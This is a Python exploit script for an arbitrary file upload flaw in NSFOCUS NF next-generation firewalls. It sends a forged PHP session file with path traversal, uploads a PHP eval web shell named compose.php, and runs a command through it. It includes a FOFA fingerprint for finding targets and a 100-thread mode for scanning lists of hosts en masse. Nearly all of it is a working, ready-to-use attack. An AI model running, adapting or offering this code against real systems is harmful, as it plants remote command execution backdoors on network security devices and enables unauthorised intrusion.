#绿盟 NF下一代防火墙 任意文件上传漏洞 绿盟 SSLVPN 存在任意文件上传漏洞，攻击者通过发送特殊的请求包可以获取服务器权限，进行远程命令执行
# /api/v1/device/bugsInfo
#app="NSFOCUS-下一代防火墙"
# 导包
import requests,sys,argparse,re,time,colorama
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 校验证书错的时候防止报错
from colorama import Fore, Style
# GREEN = '\033[92m' #GREEN是一个表示绿色的ANSI转义序列，\033[92m用于设置文本颜色为绿色，RESET是用于重置文本颜色的ANSI转义序列，\033[0m用于将文本颜色恢复为默认值。
# RESET = '\033[0m'
BLUE = Fore.BLUE
RESET = Style.RESET_ALL
# 指纹模块
def banner():
    banner = """

 ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀    ███▄    █  ▒█████   █     █░    ▐██▌ 
▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒     ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░    ▐██▌ 
▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█     ▐██▌ 
░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█     ▓██▒ 
 ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ▒██░   ▓██░░ ████▓▒░░░██▒██▓     ▒▄▄  
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒      ░▀▀▒ 
  ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░   ░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░      ░  ░ 
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░         ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░        ░    
                                     ░                                                        
                                    @author:           sawa
                                    @version:          1.0.0
                                    For:               绿盟 NF下一代防火墙 任意文件上传漏洞
"""
    print(banner)

# 主函数模块
def main():
    banner()
    parser = argparse.ArgumentParser(description="This is a 绿盟 NF下一代防火墙 任意文件上传vulnerability")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your urllink')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path(Absolute Path)')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")# print("Usage:\n\t python3 {} -h".format(sys.argv[0]))
        

# poc模块
def poc(target):
    payload_url ="/api/v1/device/bugsInfo"
    url = target+payload_url
    headers =  {"Content-Type": "multipart/form-data; boundary=1d52ba2a11ad8a915eddab1a0e85acd9"}
    headers1 = {"Content-Type": "multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef"}
    cookies = {"PHPSESSID_NF": "82c13f359d0dd8f51c29d658a9c8ac71"}
    headers2 = {"Content-Type": "application/x-www-form-urlencoded"}
    data = "--1d52ba2a11ad8a915eddab1a0e85acd9\r\nContent-Disposition: form-data; name=\"file\"; filename=\"sess_82c13f359d0dd8f51c29d658a9c8ac71\"\r\n\r\nlang|s:52:\"../../../../../../../../../../../../../../../../tmp/\";\r\n\r\n--1d52ba2a11ad8a915eddab1a0e85acd9--"
    data1 = "--4803b59d015026999b45993b1245f0ef\r\nContent-Disposition: form-data; name=\"file\"; filename=\"compose.php\"\r\n\r\n\r\n<?php eval($_POST['cmd']);?>\r\n\r\n--4803b59d015026999b45993b1245f0ef--"
    data2 = {"cmd": "phpinfo();"}
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    #     }
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=5)
        res1 = requests.post(url=url,headers=headers1,data=data1,verify=False,timeout=5)
        res2 = requests.post(url=target+'/mail/include/header_main.php',headers=headers2,cookies=cookies,data=data2,verify=False,timeout=5)
        # match = re.search(r'VIDEO/(\d+\.jsp)',res.text)
        # result = target + '/publishingImg/'+ match.group(0)
        if  (res.status_code == 200 and "ip" in res.text) or (res1.status_code == 200 and "ip" in res1.text ) or (res2.status_code == 200 and "DOCT" in res2.text):
            print( f"{BLUE}[+] {target} Vulnerability exists,\n{RESET}")
            with open ('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+"\n")
        else :
            print(f"[-] {target} Vulnerability does not exist")
            with open ('without-bug.txt','a',encoding='utf-8') as fp:
                fp.write(target+"\n")      
    except Exception as e:
        print(f"[*] {target} server error,{e}")
        with open ('warning.txt','a',encoding='utf-8') as fp:
            fp.write(target+"\n")

if __name__ == '__main__':
    main()
